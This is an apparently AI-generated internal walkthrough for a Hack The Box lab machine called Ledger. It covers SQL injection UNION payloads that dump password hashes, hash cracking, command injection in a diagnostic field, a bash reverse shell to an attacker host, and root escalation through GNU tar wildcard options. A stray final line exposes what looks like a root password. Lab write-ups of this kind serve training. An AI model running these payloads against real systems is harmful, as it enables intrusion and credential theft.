# Ledger — validation walkthrough (internal only)

> **Do not submit this document to Hack The Box.** It was generated with AI as
> an internal build-validation aid. HTB explicitly prohibits AI-generated
> submission documentation. The author must replay the machine, take original
> screenshots and write the final submission walkthrough independently.

## Scenario

Northbridge Accounting operates an internal reporting portal at `ledger.htb`.
The company is migrating away from a legacy report importer, but its diagnostic
tool and service credentials remain in production. The intended path follows the
trust chain from the reporting portal to the importer account and finally to the
privileged backup process.

## 1. Enumeration

Add the target to the attacker host file:

```bash
echo 'TARGET_IP ledger.htb' | sudo tee -a /etc/hosts
```

Enumerate all TCP ports and identify their services:

```bash
nmap -p- --min-rate 2000 -oA all-ports ledger.htb
nmap -sC -sV -p22,80 -oA services ledger.htb
```

Expected exposure: OpenSSH on 22 and nginx on 80. Browse the public pages:
`/`, `/company`, `/careers`, `/handbook` and `/service-notices`. The career
page and the notices deliberately reference the Bridgewater partner domain
`nbridged.co`, which is not hosted on the box; a directory scan also finds
`/api/v1/legacy/status`, a legacy health endpoint whose fields (night-ops,
archive-tape-daemon, pending cutover) reinforce the story and expose the path
of the directory API, but hold no credentials. The handbook and notices establish that the application has
administrator accounts, a local data store and a legacy importer diagnostic.

Opening `http://TARGET_IP/` returns an HTTP 302 redirect to
`http://ledger.htb/`. Add the displayed hostname to `/etc/hosts`; the application
vhost is not served directly for an IP or an unrelated Host header.
Four notices hint at the endgame:

- *Legacy importer credential rotation pending* — the connector still
  authenticates with a shared service credential kept in the night-operations
  runbook (preparation for the password-reuse step);
- *Nightly archive rotation* — reviewed reports are promoted into a restricted
  queue that the night-operations maintenance script repacks;
- *Close-week freeze* — diagnostics stay available to administrators while
  exports and scheduling are frozen;
- *Importer migration extended* — points administrators at the diagnostic.

## 2. Extract the administrator hash with SQL injection

The login itself uses a parameterised query. Its JavaScript performs username
autocomplete through the following endpoint:

```text
/api/v1/directory/search?name=...
```

### Discovering the API from the browser

The endpoint is public, but it is not shown as a visible link. The login page
loads it through the following script tag near the bottom of its HTML:

```html
<script src="/static/login.js"></script>
```

There are several intended ways to find it without knowing the route in advance:

1. Open `http://ledger.htb/login`.
2. Open the browser developer tools with `F12`.
3. In **Sources** (or **Debugger**), open `/static/login.js` and search for
   `fetch(`. The complete `/api/v1/directory/search?name=` path is visible in the
   source.
4. Alternatively, select the **Network** tab and filter on **Fetch/XHR**. Enter
   at least two characters, such as `re`, in the username field and click outside
   the field. The JavaScript sends a request to the directory endpoint.
5. With Burp configured as the browser proxy, the same request appears in
   **Proxy → HTTP history** even when interception is disabled.

The normal request looks like this:

```http
GET /api/v1/directory/search?name=re HTTP/1.1
Host: ledger.htb
Accept: */*
Connection: close
```

The JSON response discloses two named fields, `username` and `role`. This is a
useful initial indication, but the column count should still be verified rather
than assumed.

### Exploitation with Burp Repeater (no curl)

In **Proxy → HTTP history**, right-click the directory request and choose
**Send to Repeater**. Work only on the `name` value.

First, verify that a single quote affects the lookup:

```http
GET /api/v1/directory/search?name=%27 HTTP/1.1
Host: ledger.htb
Connection: close
```

The application catches SQLite errors and returns an empty JSON array. Determine
the number of selected columns with `ORDER BY`:

```text
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3-- 
```

`ORDER BY 1` and `ORDER BY 2` return the normal account row. `ORDER BY 3`
produces `[]`, because the original query has no third selected column. This
shows that the query returns two columns.

The same conclusion can be confirmed with `UNION SELECT`:

```text
' UNION SELECT NULL-- 
' UNION SELECT NULL,NULL-- 
```

The one-value union fails and returns `[]`; the two-value union succeeds. Now use
two arbitrary marker strings to learn where each output column appears in the
JSON. Burp can encode the selection with `Ctrl+U`; the decoded parameter is:

```text
' UNION SELECT 'probe-one','probe-two'-- 
```

`probe-one` and `probe-two` have no special meaning and are not values discovered
on the target. They are attacker-chosen labels. Any two distinguishable strings,
such as `'AAA','BBB'`, work equally well. The response shows that the first value
is rendered under `username` and the second under `role`.

The corresponding request is:

```http
GET /api/v1/directory/search?name=%27%20UNION%20SELECT%20%27probe-one%27%2C%27probe-two%27--%20 HTTP/1.1
Host: ledger.htb
Connection: close
```

The response maps the two injected values into `username` and `role`. Replace
the probes with real SQLite columns:

```text
' UNION SELECT username,password_hash FROM users-- 
```

URL-encoded in Repeater:

```http
GET /api/v1/directory/search?name=%27%20UNION%20SELECT%20username%2Cpassword_hash%20FROM%20users--%20 HTTP/1.1
Host: ledger.htb
Connection: close
```

The response contains an object similar to:

```json
{
  "username": "reports-admin",
  "role": "a941a4c4fd0c01cddef61b8be963bf4c1e2b0811c037ce3f1835fddf6ef6c223"
}
```

The `role` property contains the selected `password_hash`; JSON field names come
from the original query, not from the injected column names. Copy the 64-character
value into `admin.hash`, identify it as SHA-256, and crack it with Hashcat mode
1400 and `rockyou.txt`. It resolves to `sunshine`.

Return to the browser and sign in normally as `reports-admin` with `sunshine`.
No SQL injection is needed in the login form itself.

### Equivalent command-line validation

The following commands reproduce the browser/Burp workflow and are useful for
automated validation, but they are not required to solve the machine.

Confirm normal lookup behaviour, then determine that the result has two columns:

```bash
curl -sG --data-urlencode 'name=re' \
  http://ledger.htb/api/v1/directory/search
```

Use a two-column `UNION` to return the username and password hash:

```bash
curl -sG \
  --data-urlencode "name=' UNION SELECT username,password_hash FROM users-- " \
  http://ledger.htb/api/v1/directory/search | jq
```

Save the 64-character SHA-256 hash and crack it with hashcat:

```bash
echo 'EXTRACTED_HASH' > admin.hash
hashcat -m 1400 admin.hash /usr/share/wordlists/rockyou.txt
hashcat -m 1400 admin.hash --show
```

The recovered password is `sunshine`. Log in normally and preserve the Flask
session cookie:

```bash
curl -s -c cookies.txt \
  --data-urlencode 'username=reports-admin' \
  --data-urlencode 'password=sunshine' \
  http://ledger.htb/login -o /dev/null

curl -s -b cookies.txt http://ledger.htb/reports
```

The authenticated dashboard exposes the legacy importer and its diagnostic page.

## 3. Command injection and shell as `ledger`

The diagnostic appends its `host` parameter to a shell command. Confirm execution:

From the dashboard, use the sidebar to open **Imports**, locate **Legacy Archive**,
click **Diagnose**, and enter the following directly in the **Importer host**
field:

```text
127.0.0.1; id
```

Click **Run connectivity check**. The diagnostic output displayed below the form
contains the `ledger` UID. This is the intended browser-only confirmation of
command injection.

To obtain a reverse shell without curl, start the listener shown below, then put
this value in the same browser field after replacing `ATTACKER_IP`:

```text
127.0.0.1; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

The curl examples below are equivalent validation commands.

```bash
curl -s -b cookies.txt \
  --data-urlencode 'host=127.0.0.1; id' \
  http://ledger.htb/admin/diagnostics
```

The response includes `uid=... ledger`. Start a listener:

```bash
rlwrap nc -lvnp 4444
```

Send a bash reverse shell through the same parameter, replacing `ATTACKER_IP`:

```bash
curl -s -b cookies.txt \
  --data-urlencode "host=127.0.0.1; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" \
  http://ledger.htb/admin/diagnostics
```

If needed, upgrade the TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

## 4. Recover the importer credential

The service environment retains credentials for the legacy importer. Display the
current process environment:

```bash
env
```

Relevant values:

```text
MIRA_IMPORT_USER=mira
MIRA_IMPORT_PASSWORD=AutumnReports!2026
```

Connect over SSH for a stable shell:

```bash
ssh mira@ledger.htb
```

Read the user flag:

```bash
cat /home/mira/user.txt
```

## 5. Privilege escalation through GNU tar options

Enumerate sudo privileges:

```bash
env -i \
  HOME="$HOME" \
  USER="$USER" \
  LOGNAME="$LOGNAME" \
  PATH=/usr/bin:/bin \
  /usr/bin/sudo --list
```

`mira` may execute `/usr/local/sbin/ledger-backup` as root without a password.
The script header describes the nightly rotation mentioned by the service
notices. It loads its queue from a separate archive profile. Enumerate Mira's
supplementary groups and inspect the configuration made available to archive
operators:

```bash
id
cat /etc/ledger/archive.conf
```

The `archive-ops` membership grants read access to the root-controlled profile
and write access to the selected queue. The relevant values are:

```text
QUEUE_DIR=/var/spool/ledger/nightly
ARCHIVE_NAME=reports.tgz
```

Confirm the permissions and inspect the queue:

```bash
namei -l /var/spool/ledger/nightly
ls -la /var/spool/ledger/nightly
```

The script changes into this queue and executes:

```bash
tar czf /var/backups/ledger/archive/reports.tgz *
```

A quick look at `q3-summary.txt` confirms Mira already saw approved reports
being promoted to the nightly queue, and `/admin/settings` shows the
corresponding "Nightly maintenance snapshot" toggle. Because `mira` can create
filenames in the configured queue, the wildcard expands files whose names are
interpreted as GNU tar command-line options. Create a payload:

```bash
cd /var/spool/ledger/nightly
printf '#!/bin/sh\ncp /bin/bash /home/mira/.ledger-rootbash\nchown root:root /home/mira/.ledger-rootbash\nchmod 4755 /home/mira/.ledger-rootbash\n' > root.sh
chmod +x root.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh root.sh'
sudo /usr/local/sbin/ledger-backup
```

Execute the SUID copy while preserving privileges:

```bash
/home/mira/.ledger-rootbash -p
id
cat /root/root.txt
```

The resulting identity must be effective UID 0.

## 6. Reset after validation

Remove player-created artifacts before freezing or reusing the build snapshot:

```bash
rm -f /var/spool/ledger/nightly/root.sh
rm -f /var/spool/ledger/nightly/--checkpoint=1
rm -f '/var/spool/ledger/nightly/--checkpoint-action=exec=sh root.sh'
rm -f /home/mira/.ledger-rootbash
```

Do not place the SUID copy in `/tmp` on this build: Ubuntu 26.04 mounts `/tmp`
with `nosuid`, so the mode may display as `4755` while the kernel deliberately
ignores it. Mira's home is on the main filesystem and preserves the intended
effective UID transition.

On the attacker machine, remove the session cookie separately:

```bash
rm -f cookies.txt
```

Reboot and replay the complete chain to confirm stability. The submitted human
write-up must also document accounts, processes, systemd units, firewall rules,
automation, source files, flags and update-sensitive dependencies.



mdp root : G7!vQ2@xN9#kR4$zT8&mP6_Wc